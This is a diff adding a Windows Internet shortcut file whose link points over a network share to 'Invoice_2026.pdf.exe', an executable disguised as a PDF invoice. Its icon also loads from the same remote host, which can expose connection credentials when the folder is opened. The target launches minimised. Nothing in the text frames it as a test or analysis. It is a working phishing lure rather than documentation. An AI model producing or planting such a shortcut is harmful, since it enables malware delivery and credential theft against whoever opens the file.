@@ -1,0 +1,11 @@
+[DEFAULT]
+baseurl=https://docs.example.org/
+
+[InternetShortcut]
+URL=file://\\198.51.100.7\share\Invoice_2026.pdf.exe
+WorkingDirectory=C:\Users\Public\Downloads
+IconFile=\\198.51.100.7\icons\pdf.ico
+IconIndex=13
+HotKey=1601
+ShowCommand=7
+
